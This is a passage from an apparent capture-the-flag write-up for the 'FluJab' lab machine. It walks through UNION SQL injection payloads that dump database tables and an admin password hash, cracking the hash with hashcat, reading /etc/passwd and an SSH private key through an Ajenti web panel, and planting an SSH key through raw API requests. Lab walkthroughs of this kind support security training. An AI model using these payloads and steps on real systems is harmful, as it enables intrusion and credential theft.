<span class="k">print</span><span class="p">(</span><span class="s">"THE ORIGINAL QUERY HAS </span><span class="si">%</span><span class="s">d COLUMNS"</span> <span class="o">%</span> <span class="p">(</span><span class="n">query_columns</span><span class="p">))</span>
</code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>THE ORIGINAL QUERY HAS 5 COLUMNS
</code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>This needs to be done to be able to use <code class="highlighter-rouge">UNION</code> during injection</li>
            </ul>
          </li>
          <li>Check which column leaks information during query:
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT '</span><span class="n">one</span><span class="s1">','</span><span class="n">two</span><span class="s1">','</span><span class="n">three</span><span class="s1">','</span><span class="n">four</span><span class="s1">','</span><span class="n">five</span><span class="s1">' #
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Subject: Flu Jab Appointment - Ref:three
...
</code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>The third column is output to the <code class="highlighter-rouge">Subject</code> header</li>
            </ul>
          </li>
          <li>Enumerate the service:
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,@@version,4,5 #
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
...
</code></pre></div>            </div>
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,system_user(),4,5 #
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Subject: Flu Jab Appointment - Ref:root@localhost
...
</code></pre></div>            </div>
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,database(),4,5 #
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Subject: Flu Jab Appointment - Ref:vaccinations
...
</code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li><code class="highlighter-rouge">MariaDB</code> is just the same as <strong>MySQL</strong></li>
              <li>The user hosting the <code class="highlighter-rouge">MariaDB</code> service is <code class="highlighter-rouge">root</code>
                <ul>
                  <li>Using high privilege commands should not be a problem</li>
                </ul>
              </li>
              <li>The current database used by the service is <code class="highlighter-rouge">vaccinations</code></li>
            </ul>
          </li>
          <li>Retrieve relevant information from the database:
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database(); #    
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Subject: Flu Jab Appointment - Ref:admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats
...
</code></pre></div>            </div>
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_schema=database() AND table_name='</span><span class="k">admin</span><span class="s1">'; #    
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Subject: Flu Jab Appointment - Ref:id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges
...
</code></pre></div>            </div>
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(&lt;column_name&gt;),4,5 FROM admin; #
</span></code></pre></div>            </div>
            <ul>
              <li>
                <p><code class="highlighter-rouge">admin</code> table:</p>

                <p>id | loginname | namelc | email | access | created | modified | modifiedby | password | passwordchanged | superuser | disabled | privileges
 ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî | ‚Äî
 1 | sysadm | administrator | syadmin@flujab.htb | sysadmin-console-01.flujab.htb | 2018-07-02 08:45:19 | 2018-12-02 00:01:02 |  | a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602 |  2018-07-02 | 1 | 0 |
<strong>NOTE(S)</strong>:</p>
              </li>
              <li>A new subdomain presents itself (<code class="highlighter-rouge">sysadmin-console-01.flujab.htb</code>)</li>
              <li>The <code class="highlighter-rouge">password</code> is encrypted using <strong>SHA-256</strong>:
                <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">hashcat --force -m1400 a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602 /usr/share/wordlists/rockyou.txt 
</span></code></pre></div>                </div>
                <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:th3doct0r
</code></pre></div>                </div>
              </li>
              <li>The password for <code class="highlighter-rouge">sysadm</code> is <code class="highlighter-rouge">th3doct0r</code></li>
            </ul>
          </li>
        </ol>
      </li>
    </ol>
  </li>
</ul>

<hr />

<h2 id="part-3--generate-user-shell">PART 3 : Generate User Shell</h2>

<ol>
  <li>Add <code class="highlighter-rouge">sysadmin-console-01.flujab.htb</code> to local <strong>/etc/hosts</strong>:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
...
10.10.10.124    sysadmin-console-01.flujab.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div>    </div>
  </li>
  <li>Accessing https://sysadmin-console-01.flujab.htb:
    <ul>
      <li>
        <p>Landing Page:</p>

        <p><img src="./screenshots/443_sysadmin_console_01.png" alt="Direct IP Address not allowed" /></p>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>What if the page is requested over <strong><em>port 8080</em></strong></li>
    </ul>
  </li>
  <li>Accessing https://sysadmin-console-01.flujab.htb:8080:
    <ul>
      <li>
        <p>Landing Page: https://clownware.htb/cwerror_denied.php</p>

        <p><img src="./screenshots/8080_sysadmin_console_01_cwerror.gif" alt="cwerror_denied" /></p>
      </li>
      <li>Requesting over <code class="highlighter-rouge">curl</code>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">curl -I -k https://sysadmin-console-01.flujab.htb:8080
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
Date: ..., .. May 2019 ..:..:.. GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: https://clownware.htb/cwerror_denied.php
Server: ClownWare Proxy
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
      </li>
      <li>The page has a <strong>Permanent Redirect</strong>(<strong><em>301</em></strong>) to <code class="highlighter-rouge">.../cwerror_denied.php</code></li>
      <li>The subdomain may be suffering from a <strong><em>cached redirect</em></strong>:</li>
      <li>Cached redirects could be bypassed by:
        <ul>
          <li>Adding a <strong><em>trailing slash</em></strong> (/)</li>
          <li>Adding a <strong><em>unique</em></strong> parameter that hasn‚Äôt been cached:
            <ul>
              <li><strong>/?</strong>, <strong>/?something_unique</strong>, or <strong>/?unique=something</strong></li>
            </ul>
          </li>
        </ul>
      </li>
      <li>There was a <code class="highlighter-rouge">urlcache</code> table in the <code class="highlighter-rouge">vaccinations</code> database</li>
    </ul>
  </li>
  <li>Check the <code class="highlighter-rouge">urlcache</code> table in <code class="highlighter-rouge">vaccinations</code> using <code class="highlighter-rouge">nhsnum</code> in <strong><em>/?remind</em></strong>
    <ul>
      <li>SQL Injection payload:
        <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_schema=database() AND table_name='</span><span class="n">urlcache</span><span class="s1">'; #
</span></code></pre></div>        </div>
      </li>
      <li>SMTP Server:
        <pre><code class="language-smtp">Subject: Flu Jab Appointment - Ref:id,url,lastmodified,added,content
</code></pre>
      </li>
      <li>SQL Injection payload:
        <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(url),4,5 FROM urlcache; #
</span></code></pre></div>        </div>
      </li>
      <li>SMTP Server:
        <pre><code class="language-smtp">Subject: Flu Jab Appointment - Ref:
</code></pre>
        <p><strong>NOTE(S)</strong>:</p>
      </li>
      <li>There doesn‚Äôt seem to be anything cached on the server</li>
      <li>Clear browser cache (<code class="highlighter-rouge">Ctrl + Shift + Del</code> for FireFox)</li>
    </ul>
  </li>
  <li>Revisit https://sysadmin-console-01.flujab.htb:8080/?
    <ul>
      <li>
        <p>Landing Page: /view/login/normal</p>

        <p><img src="./screenshots/8080_sysadmin_console_01_ajenti.png" alt="Ajenti" /></p>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The redirect no longer goes to <strong>‚Ä¶/cwerror/denied.php</strong></li>
      <li>It now redirects to an <strong>Ajenti</strong> login page</li>
    </ul>
  </li>
  <li>Login using <code class="highlighter-rouge">sysadm:th3doct0r</code>
    <ul>
      <li>
        <p>Ajenti Dashboard:</p>

        <p><img src="./screenshots/8080_sysadmin_console_01_dashboard.png" alt="Ajenti Dashboard" /></p>
      </li>
    </ul>
  </li>
  <li>Read files using Ajenti‚Äôs Notepad feature:
    <ul>
      <li><strong>/view/notepad//etc/passwd</strong>:
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
...
drno:x:1000:1000:drno,,,:/home/drno:/bin/rbash
...
nursejackie:x:1002:1006:,,,:/home/nursejackie:/bin/rbash
sysadm:x:1003:1007:,,,:/home/sysadm:/bin/rbash
drblack:x:1004:1008:,,,:/home/drblack:/bin/rbash
drwhite:x:1005:1009:,,,:/home/drwhite:/bin/rbash
drstrange:x:1006:1010:,,,:/home/drstrange:/bin/rbash
drfoster:x:1007:1011:,,,:/home/drfoster:/bin/rbash
dryi:x:1008:1012:,,,:/home/dryi:/bin/rbash
drpo:x:1009:1013:,,,:/home/drpo:/bin/rbash
drsmith:x:1010:1014:,,,:/home/drsmith:/bin/rbash
drjones:x:1011:1015:,,,:/home/drjones:/bin/rbash
drgreene:x:1012:1016:,,,:/home/drgreene:/bin/rbash
drshipman:x:1013:1017:,,,:/home/drshipman:/bin/rbash
drwho:x:1014:1018:,,,:/home/drwho:/bin/rbash
nursepeter:x:1015:1019:,,,:/home/nursepeter:/bin/rbash
nurseyi:x:1016:1020:,,,:/home/nurseyi:/bin/rbash
nursemoe:x:1017:1021:,,,:/home/nursemoe:/bin/rbash
drcrick:x:1018:1022:,,,:/home/drcrick:/bin/rbash
drstones:x:1019:1023:,,,:/home/drstones:/bin/rbash
nursewhitstone:x:1020:1024:,,,:/home/nursewhitstone:/bin/rbash
nursetumble:x:1021:1025:,,,:/home/nursetumble:/bin/rbash
nursewaters:x:1022:1026:,,,:/home/nursewaters:/bin/rbash
nursewalters:x:1023:1027:,,,:/home/nursewalters:/bin/rbash
nursebluecoats:x:1024:1028:,,,:/home/nursebluecoats:/bin/rbash
drme:x:1025:1029:,,,:/home/drme:/bin/rbash
drnu:x:1026:1030:,,,:/home/drnu:/bin/rbash
drre:x:1027:1031:,,,:/home/drre:/bin/rbash
drdre:x:1028:1032:,,,:/home/drdre:/bin/rbash
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>All users have a restricted shell <code class="highlighter-rouge">/bin/rbash</code></li>
          <li>The user, <code class="highlighter-rouge">drno</code>, has an <code class="highlighter-rouge">~/.ssh</code> directory</li>
          <li>THere is a mismatch of <code class="highlighter-rouge">uid</code>s and <code class="highlighter-rouge">gid</code>s</li>
        </ul>
      </li>
      <li><strong>/view/notepad//home/drno/.ssh/userkey</strong>:
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B
     
zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Export <code class="highlighter-rouge">userkey</code> file to local machine</li>
          <li>Change <code class="highlighter-rouge">userkey</code>‚Äôs permissions ‚Äì <code class="highlighter-rouge">chmod 400 userkey</code></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Connect to 10.10.10.124 via <code class="highlighter-rouge">ssh</code>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ssh -i userkey -l drno 10.10.10.124
</span></code></pre></div>    </div>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh_exchange_identification: Connection closed by remote host
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The connection should work but it doesn‚Äôt</li>
    </ul>

    <ol>
      <li>Go back to Ajenti‚Äôs Notepad:
        <ul>
          <li><strong>/view/notepad//etc/ssh/sshd_config</strong>
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nv">$OpenBSD</span>: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp <span class="nv">$ </span>
<span class="go">      
</span><span class="c">...
</span><span class="go">
</span><span class="gp">#</span><span class="w"> </span>Expect .ssh/authorized_keys2 to be disregarded by default <span class="k">in </span>future.
<span class="go">AuthorizedKeysFile .ssh/authorized_keys access

</span><span class="c">...
</span></code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>Public keys are read from <code class="highlighter-rouge">.ssh/authorized_keys</code> and/or <code class="highlighter-rouge">access</code></li>
            </ul>
          </li>
          <li><strong>/view/notepad//home/drno/.ssh/authorized_keys</strong>:
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
</code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>Remote connections must be <strong>whitelisted</strong></li>
              <li>The public key requires a <strong>passphrase</strong></li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Edit <code class="highlighter-rouge">hosts.allow</code> file using Ajenti‚Äôs Notepad:
        <ul>
          <li><strong>/view/notepad//etc/hosts.allow</strong>:
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># grant ssh access per host
# syntax:
# sshd : [host ip]
###########################

sshd : 10.10.15.10
sshd : l27.0.0.1
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>Retry the connection via <code class="highlighter-rouge">ssh</code>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ssh -i userkey -l drno 10.10.10.124
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter passphrase for key '/tmp/test': 
drno@10.10.10.124: Permission denied (publickey).
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>No credentials for <code class="highlighter-rouge">drno</code> has been found so far</li>
        </ul>
      </li>
      <li>Attempt creating an <strong>ssh key</strong> and upload to a writable user:
        <ol>
          <li>Create a key using <code class="highlighter-rouge">ssh-keygen</code>:
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ssh-keygen -t rsa -b 4096
</span></code></pre></div>            </div>
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Generating public/private rsa key pair.
Enter file in which to save the key (/home/.../.ssh/id_rsa): .ssh/id_rsa
Enter passphrase (empty for no passphrase): flujab
Enter same passphrase again: flujab
Your identification has been saved in .ssh/id_rsa.
Your public key has been saved in .ssh/id_rsa.pub.
The key fingerprint is:
SHA256:xHmVZlXhLq8Gp0FvcWd9IFKymV97HHM6BP3K3RxkEVw jebidiah@LAPTOP-C54THGLR
The key's randomart image is:
+---[RSA 4096]----+
|          ..++o=E|
|       . ..*=.++ |
|        + =+ .=*o|
|       . . o +.*X|
|        S . oo**B|
|           o +=o+|
|            *  . |
|           . ..  |
|            ..   |
+----[SHA256]-----+
</code></pre></div>            </div>
          </li>
          <li>Upload <code class="highlighter-rouge">id_rsa.pub</code> to a writable user directory:
            <ol>
              <li>Write a file using the Ajenti API:
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/filesystem/write//home/sysadm/access?encoding=utf-8</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">sysadmin-console-01.flujab.htb:8080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://sysadmin-console-01.flujab.htb:8080/view/notepad//home/sysadm/access</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">724</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">...</span>

<span class="err">ssh-rsa</span><span class="w"> </span><span class="err">AAAAB</span><span class="mi">3</span><span class="err">NzaC</span><span class="mi">1</span><span class="err">yc</span><span class="mi">2</span><span class="err">EAAAADAQABAAACAQCiZ+jqG</span><span class="mi">9</span><span class="err">aLGvumbTF</span><span class="mi">4</span><span class="err">wGsff</span><span class="mi">1</span><span class="err">tooQuWOFvqSqna</span><span class="mi">7</span><span class="err">O</span><span class="mi">0</span><span class="err">hSdDIB</span><span class="mi">43</span><span class="err">mwIy</span><span class="mi">1</span><span class="err">yYGvhH</span><span class="mi">75</span><span class="err">T</span><span class="mi">9</span><span class="err">h</span><span class="mi">4</span><span class="err">XkFc</span><span class="mi">1</span><span class="err">PeWdflT</span><span class="mi">14</span><span class="err">ox</span><span class="mi">4</span><span class="err">M</span><span class="mi">1</span><span class="err">imLIk</span><span class="mi">8</span><span class="err">DMFHZLac</span><span class="mi">9</span><span class="err">e/nEs+cJzmk+BDVG</span><span class="mi">5</span><span class="err">AckG</span><span class="mi">3</span><span class="err">DnSaa</span><span class="mi">0</span><span class="err">f</span><span class="mi">3</span><span class="err">ftfSsRVqCnD</span><span class="mi">3</span><span class="err">SXdhYH+KKO</span><span class="mi">2</span><span class="err">WaQRt</span><span class="mi">4</span><span class="err">Nsv</span><span class="mi">6</span><span class="err">BGcomnJm/b</span><span class="mi">1</span><span class="err">vr/zn</span><span class="mi">2</span><span class="err">fkwEiC</span><span class="mi">0</span><span class="err">fI</span><span class="mi">2</span><span class="err">cENvZ</span><span class="mi">3</span><span class="err">HaEvVrVnDESc</span><span class="mi">4</span><span class="err">TKPiPiZSZ</span><span class="mi">8</span><span class="err">TnfMi++nDwVbZOroOoo</span><span class="mi">1</span><span class="err">InrL</span><span class="mi">3</span><span class="err">jSDYuuZR</span><span class="mi">0</span><span class="err">Qn</span><span class="mi">7</span><span class="err">TGMoh+anLBxdCRgQuPqav</span><span class="mi">1</span><span class="err">br</span><span class="mi">0</span><span class="err">g</span><span class="mi">0</span><span class="err">OrTvr</span><span class="mi">39</span><span class="err">IsfsCPNVSrknISPnzPvekaYJkoihdTwezbaCo</span><span class="mi">63</span><span class="err">/wBhTk</span><span class="mi">25</span><span class="err">nW+y</span><span class="mi">57</span><span class="err">b</span><span class="mi">3</span><span class="err">FRaCyUbBCw</span><span class="mi">5</span><span class="err">+Qrshc</span><span class="mi">5</span><span class="err">HNxYhfy</span><span class="mi">1</span><span class="err">pujFkfVDfuKgZhUFIGJKqkFjX+DTJqulZL</span><span class="mi">8</span><span class="err">LtyoWrhGVIBkYmblAIchc</span><span class="mi">8</span><span class="err">ZXwzDnHPyezqTmrYTuSNipuFCYcVQ</span><span class="mi">8</span><span class="err">iYXprIAXlNHFh</span><span class="mi">4e0</span><span class="err">+mgnJ/J</span><span class="mi">0</span><span class="err">QS</span><span class="mi">5</span><span class="err">mvVQaDlRrZnB</span><span class="mi">1</span><span class="err">s</span><span class="mi">9</span><span class="err">/</span><span class="mi">6</span><span class="err">VDSUH</span><span class="mi">7</span><span class="err">W</span><span class="mi">8</span><span class="err">X+ZbC</span><span class="mi">4</span><span class="err">lKM</span><span class="mi">816</span><span class="err">VHnBJDW/IZw+LK</span><span class="mi">4</span><span class="err">jf</span><span class="mi">4</span><span class="err">tndx</span><span class="mi">2</span><span class="err">GZCsa</span><span class="mi">8</span><span class="err">aI</span><span class="mi">6</span><span class="err">u</span><span class="mi">9</span><span class="err">WvUAfc</span><span class="mi">5</span><span class="err">gHkrx</span><span class="mi">5</span><span class="err">EZT</span><span class="mi">2</span><span class="err">ewIbjNKdIeFOEY/</span><span class="mi">2</span><span class="err">kCFypGGBB</span><span class="mi">5758</span><span class="err">wgfS</span><span class="mi">7</span><span class="err">MDbFtI</span><span class="mi">1</span><span class="err">hgZ</span><span class="mi">8</span><span class="err">+fGac</span><span class="mi">3</span><span class="err">Bt</span><span class="mi">2</span><span class="err">MEWKM</span><span class="mi">2</span><span class="err">vO</span><span class="mi">9</span><span class="err">IgBH</span><span class="mi">8</span><span class="err">vaTbLvxIOs</span><span class="mi">3</span><span class="err">gnTR</span><span class="mi">3</span><span class="err">i/EPKh</span><span class="mi">8</span><span class="err">IG</span><span class="mi">8</span><span class="err">/VOwGneT</span><span class="mi">4</span><span class="err">kNJQN+hQ==</span><span class="w">
</span></code></pre></div>                </div>
                <p><strong>NOTE(S)</strong>:</p>
                <ul>
                  <li>The user, <code class="highlighter-rouge">sysadm</code>, has a writable home directory</li>
                  <li>The file saved is named <code class="highlighter-rouge">access</code> (referring to <code class="highlighter-rouge">sshd_config</code>)</li>
                </ul>
              </li>
              <li>Change the file permissions of the uploaded public key:
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/filesystem/chmod//home/sysadm/access?encoding=utf-8</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">sysadmin-console-01.flujab.htb:8080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://sysadmin-console-01.flujab.htb:8080/view/notepad//home/sysadm/access</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">12</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">...</span>

<span class="p">{</span><span class="nl">"mode"</span><span class="p">:</span><span class="mi">292</span><span class="p">}</span><span class="w">
</span></code></pre></div>                </div>
                <p><strong>NOTE(S)</strong>:</p>
                <ul>
                  <li>According to the <a href="http://docs.ajenti.org/en/latest/refjs/filesystem.html"><code class="highlighter-rouge">ajenti.filesystem</code> documentation</a>,
                    <ul>
                      <li><code class="highlighter-rouge">chmod</code> accepts 2 arguments ‚Äì <code class="highlighter-rouge">(path, mode)</code>:</li>
                      <li><code class="highlighter-rouge">mode</code> accepts an integer value</li>
